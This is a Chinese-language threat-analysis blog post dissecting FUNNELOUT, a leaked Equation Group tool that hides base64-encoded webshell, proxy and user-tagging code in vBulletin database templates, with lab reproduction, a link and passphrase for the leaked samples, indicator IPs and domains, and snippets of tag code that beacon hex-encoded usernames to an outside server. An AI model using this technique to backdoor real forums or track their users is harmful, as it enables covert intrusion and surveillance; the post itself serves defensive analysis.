---
layout: post
title: Equation Group泄露工具之vBulletin无文件后门分析
date: 2018-01-26 09:21:06
categories: [Red Team, Threat Analysis]
---


### 一、前言

方程式泄漏的几波样本虽然大都已是好些年前人家就在用的，但是时至今日我们再分析这些样本，所涉及的技术细节、攻击方法、思维和角度还是令人叹为观止，更有包括像Eternal系列的漏洞更是直接带来了巨大的影响。其中有一个泄漏了方程式本身ip的样本引得全球安全研究人员所注意，但目前公开的都是关于对该样本的猜想，并无技术分析。该样本是一个专门针对vBulletin论坛系统的功能远控工具，FormSec将在本文当中对该样本进行详细的技术分析和APT攻击解读。

<!--more-->

vBulletin（https://www.vbulletin.com/）是一个强大，灵活并可完全根据自己的需要定制的论坛程序套件，在全球范围内使用都非常广泛，很多大型论坛都选择vBulletin作为自己的社区。

### 二、样本分析

**样本来源：**

- Original file: https://mega.nz/\#!zEAU1AQL!oWJ63n-D6lCuCQ4AY0Cv_405hX8kn7MEsa1iLH5UjKU


-   Passphrase: CrDj"(;Va.\*NdlnzB9M?\@K2)\#\>deB7mN (as disclosed by the
    ShadowBrokers, source)

-   https://github.com/x0rz/EQGRP

该功能远控名为FUNNELOUT共涉及四个版本，各版本功能基本一致，适用时间范围大概08年至13年之间，而且根据现有的分析结果来看，该工具和vBulletin系统的结合度非常高，利用的核心原理就是vBulletin框架加载template时的特殊逻辑，可以推断如果vBulletin的版本更新中框架不做大的调整，该工具就一直适用，可能现在已经有了更新的版本。

![](http://reverse-tcp.xyz/static/img/media/ec2a9592aeedcb36b64c4b5896ce4b86.png)

这里我们挑选v4.1.0.1版本进行分析。脚本运行环境需要perl支持，直接运行该脚本会展示出该工具的使用方法，其中包括数据库的连接方法、后门操作及其他可自定义参数等。

![](http://reverse-tcp.xyz/static/img/media/fdcf78b736b263b86d1c18f912f5396b.png)

数据库连接分为两种，一种是直接通过定义数据库连接的相关参数进行数据库访问，包括数据库的ip地址、端口、vbulletin库名、用户名、密码等，在mysql可远程访问时可以通过这种方法连接至数据库进行远程控制；另一种方式就是脚本直接读取vBulletin的数据库配置文件config.php进行解析，获取host、port、dbuser、dbpass、dbname等再进行数据库连接，当然可能是在应用服务器上执行，也可能是将配置文件拖回来后本地解析再远程访问等情况。

对于远程控制的op选项大概分为backdoor、proxy及tag三大功能，其他都是围绕这三点的植入、清除和查看统计等功能，从其命名上也能猜的出来。

接下来我们对这三大块核心功能操作进行分析解读。

#### Backdoor

door功能的实现比较简单粗暴，这里首先看一下door功能的实现代码，可以看出是直接将一句话后门经过base64编码后放在了数据库当中，默认拼接到了template表的footer
template当中。

![](http://reverse-tcp.xyz/static/img/media/38a63ecff5c2ae7250fac81f43d9b05e.png)

![](http://reverse-tcp.xyz/static/img/media/29eeb87c4796bbe9b31a3c0d4bca2f6f.png)

接下来进行复现，运行脚本指定door将后门插入到数据库当中。

![](http://reverse-tcp.xyz/static/img/media/ee47123679827a6d20e714fc875e1183.png)

通过showDoor可以看出后门代码通过base64已经拼接在template当中

![](http://reverse-tcp.xyz/static/img/media/b0d9603e573e2944e4fe241dbb96f808.png)

回过头来我们再看看vBulletin的代码，为什么会这样设置后门。

vBulletin的整个框架实现就将需要调用的各种template放在了数据库当中，当调用时会从template表中取出并eval执行，脚本的开发者正是利用了这个逻辑进行后门植入。比如说这里的door的实现，vBulletin的global.php中含有对header和footer模板的调用，funnelout默认是将proxy和door的后门代码植入到了这两个template表当中，如下图所示template代码被取出执行，其中包含的后门代码也被一并执行。

![](http://reverse-tcp.xyz/static/img/media/44a9c51d3234cf16b0da9e9cab6b79f0.png)

![](http://reverse-tcp.xyz/static/img/media/0c2a65b517851b8e2dcbd7ca28c0e248.png)

因此vBulletin论坛的维护人员若是在应用服务器进行恶意代码查杀肯定是无效的，只有进行数据库安全审计才可能触发告警，毕竟还要看是否有相关规则，这也就是该后门的厉害之处。

当然所有包含global.php的页面都可以触发后面执行，只需要将需要执行的代码放在请求头的Referrer自定义属性当中即可。

![](http://reverse-tcp.xyz/static/img/media/2ea452c1abd4ce5ca1cbfb5fa8e6aa59.png)

#### Proxy

funnelout的Proxy实现原理与door一致，不过proxy的代码相对复杂一些，proxy有一套模板代码，脚本使用者可以根据实际环境定义代理要访问的host及path等，最后生成特定的proxy代码。

![](http://reverse-tcp.xyz/static/img/media/7c007f0ddefb439c76093d0b7bafdfca.png)

![](http://reverse-tcp.xyz/static/img/media/044d6b41980c104a1903fdc1c510805d.png)

接下来进行proxy功能复现，使用proxy时需要指定tag，我们根据代码构造一个简单的tag并插入

![](http://reverse-tcp.xyz/static/img/media/a1433ebe0e718c75b93af31f858766b6.png)

插入代理后可以使用对应的showProxy查看header
template的内容，和door一样已经过base64编码后拼接在了数据库当中

![](http://reverse-tcp.xyz/static/img/media/970f90c2c2f30e9398d64a66b1c381b1.png)

我们看一下被植入base64解码后的proxy代码，如下图所示我已经在代码中进行了一些标注来方便大家理解代码，大概逻辑就是获取到了代理需要请求的内网web服务host，并封装出一个请求包来向内网web服务器发送通过匹配的url请求，可以是get请求也可以post请求，post
data就是向vbulletin请求提交的data。

![](http://reverse-tcp.xyz/static/img/media/8d6248e61aa5ac673818d309bb03d8b5.png)

可以看出其中将64.38.3.50加入了黑名单中，在这里的具体意义还不确定，但可以确定这是攻击者所操作的一台server，威胁情报中也关联到很多和这个ip有关的方程式样本。

![](http://reverse-tcp.xyz/static/img/media/32de775b47bfc43a80cbf9ff876d2d4c.png)

最后proxy的复现情况如下，但是这里说的proxy不能说是完全意义上的代理，更有点像ssrf的那种意思

![](http://reverse-tcp.xyz/static/img/media/25dd3b488c01414ec750f8c6a3bd11aa.png)

![](http://reverse-tcp.xyz/static/img/media/8ae0c14f4800697243b0117446cf44f4.png)

#### Tag

Tag代码大体上分为两种，第一种是在建立代理时，脚本会自动加一个proxytag，我们可以使用findAll查看，默认是植入在navbar
template当中。

![](http://reverse-tcp.xyz/static/img/media/c04a0a9160917bb864105a7ba8eae1b9.png)

生成的Tag代码大致如下，相对复杂一些，可以发现tag代码和vBulletin代码高度融合，同样的我也在在代码当中加了一些注释方便大家理解，有兴趣的同学可以自己调试一下。tag代码的主要用途就是经过一些条件判断后触发page
view，比较有意思的是tag代码要触发show
page必须在第一次标记用户后的一天内，超过一天就无效了，只能进行reset，有点自毁程序的意思，并且在第一次标记用户后会产生一个默认为0-6的随机数，随机数随访问次数递减，直至为0时才会触发通过iframe标签触发page
view，触发后该数值会再次减1到-1，并返回用户已被标记等待重置，但该功能在这里的意图目前尚不清楚。

![](http://reverse-tcp.xyz/static/img/media/919b3aff853bd1947fc4e4d6ef874cf8.png)

![](http://reverse-tcp.xyz/static/img/media/28c02e6a366140bd9d7d8a938d5924c2.png)

看一下proxytag的复现过程

某vb论坛用户登录后访问了类似链接查看私信内容：

<http://127.0.0.1:8888/vbulletin/private.php?do=showpm&pmid=14>

黑客可以通过showTagged可以查看到当前已被标记用户，并在该用户第一次访问时产生随机数4

![](http://reverse-tcp.xyz/static/img/media/03ed3c009322c218edaa27d2df3ec166.png)

也就是在该用户访问该页面4次后触发page
view，发送携带当前用户名的hex编码的请求。猜测可能是用于标记特定用户再发起针对性攻击。

![](http://reverse-tcp.xyz/static/img/media/418904cb9b388d1f036e2e181c532c03.png)

再次使用showTagged查看发现该用户已被标记并等待重置

![](http://reverse-tcp.xyz/static/img/media/a58493ebfb304893b5128e75827e2a20.png)

第二种则是使用tag命令直接插入的tag代码，这里要细分的话也可以按照是否使用nohttp分为两类，可以从代码上看出它们的区别

![](http://reverse-tcp.xyz/static/img/media/e5378214ee6f982d3d8d9e76301ee7fe.png)

对Tag进行了一个总结

| **Tag Type** | **nohttp** | **Iframe link Example**                  |  **Requester**   |           **Responser**           | **Possible uses** |
| :----------: | :--------: | :--------------------------------------- | :--------------: | :-------------------------------: | :---------------: |
|   proxytag   |            | \$htt = "showpost.php/aaa/bbb/ccc/111/ddd/"; \$htt = \$htt . bin2hex(substr(\$u,0,14)) . ".html"; | vBulletin Server | Intranet Server Or Another Server |         ？         |
|     tag      |    Yes     | \$htt = "/test/not_used_nohttp/"; \$htt = \$htt . bin2hex(substr(\$u,0,14)) . ".html"; | vBulletin Users  |         vBulletin Server          |   Apache logs？    |
|              |     No     | \$htt = "http://target.com/test/not_used_nohttp/"; \$htt = \$htt . bin2hex(substr(\$u,0,14)) . ".html"; | vBulletin Users  |         Equation Servers?         |    Tag Users？     |

这里不使用 –nohttp进行功能复现，同样是通过base64加密后放在了navbar template中

![](http://reverse-tcp.xyz/static/img/media/1ea359b7dd024586ecc3c8eec7cebd35.png)

![](http://reverse-tcp.xyz/static/img/media/0dbf50e9419f112809890646c1a46314.png)

当论坛用户访问时触发page view

![](http://reverse-tcp.xyz/static/img/media/259f55617e357b107e91a1b406ee1d55.png)

到这里tag功能基本完成分析，我们在网上找到了一个被公开的攻击痕迹，根据以上分析，这里应该是tag的第三种情况

![](http://reverse-tcp.xyz/static/img/media/ad0691dc1e5c046506adac58931581ba.png)

其中涉及的域名technology-revealed.com，历史解析记录也有很多国家。

![](http://reverse-tcp.xyz/static/img/media/ac8e3ec9d1eccde56657e31687235132.png)

![](http://reverse-tcp.xyz/static/img/media/777f4ada9d2ded7406107367a61c8909.png)

另外需要注意的是在tag代码中发现了两个特殊的md5，脚本会校验被标记用户的用户名是否与这两个md5相同

84b8026b3f5e6dcfb29e82e0b0b0f386 Unregistered (EN)

e6d290a03b70cfa5d4451da444bdea39 dbedd120e3d3cce1 (AR)

还有代码中排除标记了来自特殊地域的ip地址

```php
if(preg_match('/\^(64.38.3.50|195.28.|94.102.|91.93.|41.130.|212.118.|79.173.|85.159.|94.249.|86.108.)/',IPADDRESS)){ return ""; }
```

除了之前提到的唯一确定ip——64.38.3.50，其余ip段涉及到约旦、土耳其和埃及等国家和地区。

### 三、 猜想

最后根据以上信息，我们猜测technology-revealed.com为方程式所操控的服务器，它可以用来接收一些来自政治、民族等敏感话题讨论论坛的特殊地区用户的标记信息，从中可以筛选出特定目标，进行定点攻击，包括可以从vBulletin
访问日志中收集用户ip地址，数据库中收集用户密码信息等，再配合其他方式进行水坑攻击，比如再次利用vBulletin
template进行挂马，还有方程式的其他漏洞足以完成后续攻击，拓广战果。当然以上只是我对APT攻击环节中tag利用的猜想，具体的可能只有方程式自己人知道了。

